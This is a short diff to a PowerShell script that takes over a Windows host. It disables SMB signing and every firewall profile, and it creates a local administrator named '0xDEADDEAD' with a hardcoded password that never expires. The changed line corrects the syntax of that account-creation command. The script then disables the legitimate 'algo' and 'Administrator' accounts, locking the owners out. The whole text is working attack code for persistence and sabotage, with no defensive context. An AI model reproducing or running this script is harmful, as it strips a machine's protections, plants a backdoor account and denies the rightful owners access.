@@ -9,7 +9,7 @@ Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySigna
 Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 
 $pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
-New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires $true -Description "C0MPR0M1ZED" -Disabled $false -Password $pwd -PasswordNeverExpires $true -UserMayNotChangePassword $true
+New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
 Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
 Disable-LocalUser -Name "algo"
 Disable-LocalUser -Name "Administrator"
